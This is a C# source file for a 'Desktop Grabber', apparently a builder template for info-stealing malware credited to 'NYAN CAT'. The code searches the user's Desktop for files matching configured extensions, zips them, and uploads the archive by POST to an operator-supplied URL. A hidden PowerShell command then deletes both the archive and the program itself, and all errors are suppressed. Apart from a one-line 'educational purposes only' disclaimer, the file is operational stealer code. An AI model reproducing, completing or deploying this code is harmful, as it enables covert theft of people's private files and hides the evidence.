using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Net;
using System.Diagnostics;

namespace DesktopGrabber
{
    public class Program
    {
        public static void Main()
        {
            DesktopGrabber grabber = new DesktopGrabber();
            grabber.Extensions = new List<string>();
            grabber.Extensions.AddRange(new string[] { "@Extensions" });
            grabber.SizeLimit = @Size;
            grabber.ZipName = Path.GetTempPath() + DateTime.Now.ToString("MM-dd-yyyy_HH-mm-ss") + "_" + Environment.UserName + ".zip";
            grabber.Url = "@Url";

            grabber.Run();
        }
    }

    public class DesktopGrabber
    {

        /*
         * │ Author       : NYAN CAT
         * │ Name         : Desktop Grabber
         * │ Contact      : https:github.com/NYAN-x-CAT
         * 
         * This program is distributed for educational purposes only.
         */

        public string ZipName;
        public int SizeLimit;
        public List<string> Extensions;
        public string Url;

        public void Run()
        {
            Search();
            Send();
            Delete();
        }

        //Search for files
        private void Search()
        {
            try
            {
                List<string> files = new List<string>();
                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(0), "*.*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length <= SizeLimit && Extensions.Contains(Path.GetExtension(file.ToLower())))
                    {
                        files.Add(file);
                    }
                }
                if (files.Count == 0) return; // no files

                Save(files);
            }
            catch { }
        }

        //Get every file path on LIST and add them to ZIP file
        private void Save(List<string> files)
        {
            try
            {
                if (File.Exists(ZipName)) File.Delete(ZipName);
                using (ZipFile zip = new ZipFile())
                {
                    foreach (string file in files)
                    {
                        zip.AddFile(file);
                    }
                    zip.Save(ZipName);
                }
            }
            catch { }
        }

        private void Send()
        {
            try
            {
                if (File.Exists(ZipName) && new FileInfo(ZipName).Length > 0)
                using (WebClient Client = new WebClient())
                {
                    Client.Headers.Add("Content-Type", "application/zip");
                    Client.UploadFile(Url, "POST", ZipName);
                }
            }
            catch { }
        }

        //Delete zip file and payload after sending is finish
        private void Delete()
        {
            ProcessStartInfo processStart = new ProcessStartInfo();
            processStart.FileName = "Powershell.exe";
            processStart.Arguments = "Start-Sleep -Seconds 1.5; Remove-Item \"" + ZipName + "\"" + "; Remove-Item \"" + Process.GetCurrentProcess().MainModule.FileName + "\"";
            processStart.WindowStyle = ProcessWindowStyle.Hidden;
            processStart.CreateNoWindow = true;
            processStart.UseShellExecute = false;
            Process.Start(processStart);
        }
    }
}
